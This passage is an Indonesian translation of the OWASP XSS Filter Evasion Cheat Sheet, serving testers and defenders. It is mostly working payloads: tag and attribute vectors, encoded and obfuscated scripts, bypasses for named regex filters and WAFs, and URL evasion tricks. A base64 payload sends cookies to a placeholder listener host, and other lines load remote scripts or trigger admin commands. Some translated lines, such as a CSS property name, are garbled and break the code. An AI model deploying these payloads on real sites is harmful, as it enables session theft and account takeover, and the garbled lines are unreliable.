#### TD

Sama seperti di atas, TD rentan terhadap BACKGROUND yang berisi JavaScript XSS vektor:

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

### DIV

#### DIV Gambar latar

```html
<DIV STYLE="gambar latar: url(javascript:alert('XSS'))">
```

#### DIV Gambar latar dengan Eksploitasi Unicode XSS

Ini telah dimodifikasi sedikit untuk mengaburkan parameter URL:

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

(Kerentanan asli ditemukan oleh Renaud Lifchitz sebagai kerentanan di Hotmail)

#### DIV Background-image Plus Extra Characters

RSnake membuat fuzzer XSS cepat untuk mendeteksi karakter salah yang diizinkan setelah tanda kurung buka tetapi sebelum perintah JavaScript di IE. Karakter ini dalam bentuk desimal tetapi Anda dapat menyertakan hex dan menambahkan padding tentunya. (Karakter berikut ini dapat digunakan: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):

```html
<DIV STYLE="background-image: url( javascript:alert('XSS'))">
```

#### Ekspresi DIV

Varian serangan ini efektif terhadap filter XSS dunia nyata dengan menggunakan baris baru antara titik dua dan `ekspresi`:

```html
<DIV STYLE="width: expression(alert('XSS'));">
```

### Blok Tersembunyi di Tingkat Bawah

Hanya berfungsi pada mesin rendering IE - Trident. Beberapa situs web menganggap apa pun di dalam blok komentar aman dan karenanya tidak perlu dihapus, yang memungkinkan vektor XSS kita ada. Atau sistem mungkin mencoba menambahkan tag komentar di sekitar sesuatu dalam upaya sia-sia untuk membuatnya tidak berbahaya. Seperti yang dapat kita lihat, hal itu mungkin tidak akan berhasil:

```js
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

### Tag BASE

(Berfungsi pada IE dalam mode aman) Serangan ini memerlukan `//` untuk mengomentari karakter berikutnya sehingga Anda tidak akan mendapatkan kesalahan JavaScript dan tag XSS Anda akan ditampilkan. Selain itu, hal ini bergantung pada fakta bahwa banyak situs web menggunakan gambar yang ditempatkan secara dinamis seperti `images/image.jpg` daripada jalur lengkap. Jika jalur menyertakan garis miring depan seperti `/images/image.jpg`, Anda dapat menghapus satu garis miring dari vektor ini (selama ada dua garis miring di awal komentar, ini akan berfungsi):

```html
<BASE HREF="javascript:alert('XSS');//">
```

### Tag OBJEK

Jika sistem mengizinkan objek, Anda juga dapat menyuntikkan muatan virus yang dapat menginfeksi pengguna, dll. dengan tag APPLET. File yang ditautkan sebenarnya adalah file HTML yang dapat berisi XSS Anda:

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

### EMBED SVG yang Berisi Vektor XSS

Serangan ini hanya berfungsi di Firefox:

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

(Terima kasih kepada nEUrOO untuk ini one)

### Pulau Data XML dengan Pengaburan CDATA

Serangan XSS ini hanya berfungsi di IE:

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

### XML yang dihosting secara lokal dengan JavaScript tertanam yang dibuat menggunakan pulau data XML

Serangan ini hampir sama seperti di atas, tetapi sebaliknya merujuk ke file XML yang dihosting secara lokal (di server yang sama) yang akan menampung vektor XSS Anda. Anda dapat melihat hasilnya di sini:

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

### HTML+TIME dalam XML

Serangan ini hanya berfungsi di IE dan ingat bahwa Anda harus berada di antara tag HTML dan BODY agar ini berfungsi:

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```

(Beginilah cara Grey Magic meretas Hotmail dan Yahoo!)

### Dengan asumsi Anda hanya dapat memasukkan beberapa karakter dan memfilter terhadap `.js`

Serangan ini memungkinkan Anda mengganti nama berkas JavaScript menjadi gambar sebagai vektor XSS:

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```

### SSI (Server Side Includes)

Ini mengharuskan SSI diinstal di server untuk menggunakan vektor XSS ini. Saya mungkin tidak perlu menyebutkan ini, tetapi jika Anda dapat menjalankan perintah di server, tidak diragukan lagi ada masalah yang jauh lebih serius:

```js
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

### PHP

Serangan ini mengharuskan PHP diinstal di server. Sekali lagi, jika Anda dapat menjalankan skrip apa pun dari jarak jauh seperti ini, mungkin ada masalah yang jauh lebih serius:

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

### Perintah Tertanam IMG

Serangan ini hanya berfungsi jika ini disuntikkan (seperti papan web) di halaman web di balik perlindungan kata sandi dan perlindungan kata sandi tersebut berfungsi dengan perintah lain di domain yang sama. Ini dapat digunakan untuk menghapus pengguna, menambahkan pengguna (jika pengguna yang mengunjungi halaman tersebut adalah administrator), mengirim kredensial ke tempat lain, dll. Ini adalah salah satu vektor XSS yang jarang digunakan tetapi lebih berguna:

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

#### Perintah Tertanam IMG bagian II

Ini lebih menakutkan karena sama sekali tidak ada pengenal yang membuatnya tampak mencurigakan selain tidak dihosting di domain Anda sendiri. Vektor menggunakan 302 atau 304 (yang lain juga berfungsi) untuk mengarahkan gambar kembali ke perintah. Jadi `<IMG SRC="httx://badguy.com/a.jpg">` yang normal sebenarnya bisa menjadi vektor serangan untuk menjalankan perintah sebagai pengguna yang melihat tautan gambar. Berikut adalah baris `.htaccess` (di bawah Apache) untuk menjalankan vektor:

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```

(Terima kasih kepada Timo untuk sebagian dari ini)

### Manipulasi Cookie

Metode ini cukup tidak jelas tetapi ada beberapa contoh di mana `<META` diizinkan dan dapat digunakan untuk menimpa cookie. Ada contoh lain dari situs di mana alih-alih mengambil nama pengguna dari database, nama pengguna tersebut disimpan di dalam cookie untuk ditampilkan hanya kepada pengguna yang mengunjungi halaman tersebut. Dengan menggabungkan kedua skenario ini, Anda dapat mengubah kuki korban yang akan ditampilkan kembali kepada mereka sebagai JavaScript (Anda juga dapat menggunakan ini untuk mengeluarkan orang atau mengubah status pengguna mereka, membuat mereka masuk sebagai Anda, dll.):

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

### XSS Menggunakan Enkapsulasi Kutipan HTML

Serangan ini awalnya diuji di IE sehingga hasil yang Anda dapatkan mungkin berbeda. Untuk melakukan XSS pada situs yang mengizinkan `<SCRIPT>` tetapi tidak mengizinkan `<SCRIPT SRC...` melalui filter regex `/\<script\[^\>\]+src/i`, lakukan hal berikut:

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Jika Anda melakukan XSS pada situs yang mengizinkan `<SCRIPT>` tetapi tidak mengizinkan `\<script src...` karena filter regex yang melakukan `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (Ini penting, karena ini regex telah terlihat di alam liar):

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

XSS lain yang menghindari filter yang sama: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

XSS lain yang menghindari filter yang sama: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`

Umumnya, kita tidak membahas teknik mitigasi, tetapi satu-satunya hal yang menghentikan contoh XSS ini adalah, jika Anda masih ingin mengizinkan tag `<SCRIPT>` tetapi skrip jarak jauh bukan mesin status (dan tentu saja ada cara lain untuk mengatasinya jika mereka mengizinkan tag `<SCRIPT>`), gunakan ini:

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Dan satu serangan XSS terakhir yang harus dihindari, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` menggunakan aksen grave (sekali lagi, tidak berfungsi di Firefox):

<!-- markdownlint-disable MD038-->
```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```
<!-- markdownlint-enable MD038-->

Berikut adalah contoh XSS yang berfungsi jika regex tidak dapat menangkap pasangan tanda kutip yang cocok tetapi sebaliknya akan menemukan tanda kutip apa pun untuk mengakhiri string parameter secara tidak tepat:

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

XSS ini masih membuat saya khawatir, karena hampir tidak mungkin menghentikannya tanpa memblokir semua konten aktif:

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### Penghindaran String URL

Serangan berikut berhasil jika `http://www.google.com/` tidak diizinkan secara terprogram:

#### IP Versus Nama Host

```html
<A HREF="http://66.102.7.147/">XSS</A>
```

#### Pengodean URL

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### Pengodean DWORD

Catatan: ada beberapa variasi pengodean DWORD - lihat kalkulator Pengaburan IP di bawah ini untuk detail selengkapnya:

```html
<A HREF="http://1113982867/">XSS</A>
```

#### Pengodean Heksadesimal

Total ukuran setiap angka yang diizinkan adalah sekitar 240 karakter total seperti yang dapat Anda lihat pada digit kedua, dan karena angka heksadesimal berada di antara 0 dan F, angka nol di depan pada tanda kutip heksadesimal ketiga tidak diperlukan:

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

#### Pengodean Oktal

Sekali lagi, padding diperbolehkan, meskipun Anda harus membuatnya di atas 4 karakter total per kelas - seperti di kelas A, kelas B, dst.:

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

#### Pengodean Base64

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

#### Pengodean Campuran

Mari campur dan cocokkan penyandian dasar dan tambahkan beberapa tab dan baris baru (saya tidak akan pernah tahu mengapa peramban mengizinkan ini). Tab dan baris baru hanya berfungsi jika ini dienkapsulasi dengan tanda kutip:

<!-- markdownlint-disable MD010-->
```html
<A HREF="h
tt p://6 6.000146.0x7.147/">XSS</A>
```
<!-- markdownlint-enable MD010-->

#### Protocol Resolution Bypass

`//` diterjemahkan menjadi `http://`, yang menghemat beberapa byte lagi. Ini sangat berguna saat ruang juga menjadi masalah (dua karakter lebih sedikit dapat sangat membantu) dan dapat dengan mudah melewati regex seperti `(ht|f)tp(s)?://` (terima kasih kepada Ozh untuk bagian ini). Anda juga dapat mengubah `//` menjadi `\\\\`. Anda perlu mempertahankan garis miring di tempatnya, jika tidak, ini akan ditafsirkan sebagai URL jalur relatif:

```html
<A HREF="//www.google.com/">XSS</A>
```

#### Menghapus CNAME

Jika digabungkan dengan URL di atas, menghapus `www.` akan menghemat 4 byte tambahan sehingga total penghematan 9 byte untuk server yang telah menyiapkan ini dengan benar:

```html
<A HREF="http://google.com/">XSS</A>
```

Titik tambahan untuk DNS absolut:

```html
<A HREF="http://www.google.com./">XSS</A>
```

#### Lokasi Tautan JavaScript

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

#### Ganti Konten sebagai Vektor Serangan

<!-- markdownlint-disable MD010-->
Dengan asumsi `http://www.google.com/` diganti secara terprogram dengan tidak ada apa-apa. Vektor serangan serupa telah digunakan terhadap beberapa filter XSS dunia nyata yang terpisah dengan menggunakan filter konversi itu sendiri (ini contohnya) untuk membantu membuat vektor serangan `java&\#x09;script:` diubah menjadi `java script:`, yang ditampilkan di IE:
<!-- markdownlint-enable MD010-->

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```

### Membantu XSS dengan Pencemaran Parameter HTTP

Jika alur berbagi konten di situs web diterapkan seperti yang ditunjukkan di bawah ini, serangan ini akan berhasil. Ada halaman `Konten` yang menyertakan beberapa konten yang disediakan oleh pengguna dan halaman ini juga menyertakan tautan ke halaman `Bagikan` yang memungkinkan pengguna memilih platform berbagi sosial favorit mereka untuk membagikannya. Pengembang HTML mengodekan parameter `title` di halaman `Content` untuk mencegah XSS tetapi karena beberapa alasan mereka tidak mengodekan parameter ini ke URL untuk mencegah Pencemaran Parameter HTTP. Akhirnya mereka memutuskan bahwa karena nilai `content_type` adalah konstanta dan akan selalu berupa bilangan bulat, mereka tidak mengodekan atau memvalidasi `content_type` di halaman `Share`.

#### Kode Sumber Halaman Konten

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

#### Kode Sumber Halaman Share

```js
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>"; ...
//beberapa perjanjian pengguna dan logika pengiriman ke server mungkin ada di sini
...
</script>
```

#### Keluaran Halaman Konten

Jika penyerang menetapkan judul konten yang tidak tepercaya sebagai `Ini adalah judul biasa&content_type=1;alert(1)`, tautan di halaman `Konten` akan menjadi seperti ini:

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```

#### Keluaran Halaman Share

Dan dalam keluaran halaman share bisa seperti ini:

```js
<script>
var contentType = 1; alert(1);
var title = "Ini adalah judul biasa";
…
//beberapa perjanjian pengguna dan logika pengiriman ke server mungkin ada di sini
…
</script>
```

Akibatnya, dalam contoh ini kelemahan utamanya adalah mempercayai content_type di halaman `Share` tanpa pengodean atau validasi yang tepat. Pencemaran Parameter HTTP dapat meningkatkan dampak kelemahan XSS dengan mempromosikannya dari XSS yang dipantulkan ke XSS yang tersimpan.

## Urutan Karakter Escape

Berikut ini semua kemungkinan kombinasi karakter `\<` dalam HTML dan JavaScript. Sebagian besar tidak akan ditampilkan begitu saja, tetapi banyak di antaranya dapat ditampilkan dalam keadaan tertentu seperti yang terlihat di atas.

- `<`
- `%3C`
- `&lt`
- `&lt;`
- `&LT`
- `&LT;`
- `&#60`
- `&#060`
- `&#0060`
- `&#00060`
- `&#000060`
- `&#0000060`
- `&#60;`
- `&#060;`
- `&#0060;`
- `&#00060;`
- `&#000060;`
- `&#0000060;`
- `&#x3c`
- `&#x03c`
- `&#x003c`
- `&#x0003c`
- `&#x00003c`
- `&#x000003c`
- `&#x3c;`
- `&#x03c;`
- `&#x003c;`
- `&#x0003c;`
- `&#x00003c;`
- `&#x000003c;`
- `&#X3c`
- `&#X03c`
- `&#X003c`
- `&#X0003c`
- `&#X00003c`
- `&#X000003c`
- `&#X3c;`
- `&#X03c;`
- `&#X003c;`
- `&#X0003c;`
- `&#X00003c;`
- `&#X000003c;`
- `&#x3C`
- `&#x03C`
- `&#x003C`
- `&#x0003C`
- `&#x00003C`
- `&#x000003C`
- `&#x3C;`
- `&#x03C;`
- `&#x003C;`
- `&#x0003C;`
- `&#x00003C;`
- `&#x000003C;`
- `&#X3C`
- `&#X03C`
- `&#X003C`
- `&#X0003C`
- `&#X00003C`
- `&#X000003C`
- `&#X3C;`
- `&#X03C;`
- `&#X003C;`
- `&#X0003C;`
- `&#X00003C;`
- `&#X000003C;`
- `\x3c`
- `\x3C`
- `\u003c`
- `\u003C`

## Metode untuk Melewati WAF – Cross-Site Scripting

### Masalah umum

#### XSS yang tersimpan

Jika penyerang berhasil mendorong XSS melalui filter, WAF tidak akan dapat mencegah serangan tersebut.

#### XSS yang terpantul dalam JavaScript

Contoh:

```js
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```

Eksploitasi:

```js
/?xss=500); alert(document.cookie);//
```

#### XSS berbasis DOM

Contoh:

```js
<script> ... eval($\_GET\[xss\]); ... </script>
```

Eksploitasi:

```js
/?xss=document.cookie
```

#### XSS melalui Pengalihan permintaan

Kode yang rentan:

```js
...
header('Lokasi: '.$_GET['param']);
...
```

Serta:

```js
...
header('Refresh: 0; URL='.$_GET['param']); ...
```

Permintaan ini tidak akan melewati WAF:

```html
/?param=<javascript:alert(document.cookie>)
```

Permintaan ini akan melewati WAF dan serangan XSS akan dilakukan di browser tertentu:

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### String ByPass WAF untuk XSS

<!-- markdownlint-disable MD038-->
- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `<Video> <source onerror = "javascript: alert (XSS)">`
- `<Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*{x:expression(alert(/xss/))}//<style></style>`

 Saat Mouse Di Atas:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
<!-- markdownlint-enable MD038-->

### Filter Bypass Alert Obfuscation

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](1)`
- `top[‘al\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

Payload harus mencakup tanda petik terbalik di awal dan di akhir:

```js
&#96;`${alert``}`&#96;
```

###### Copyright © - This cheat sheet was created from the OWASP CheatSheetSeries reference - Source :` https://cheatsheetseries.owasp.org/ `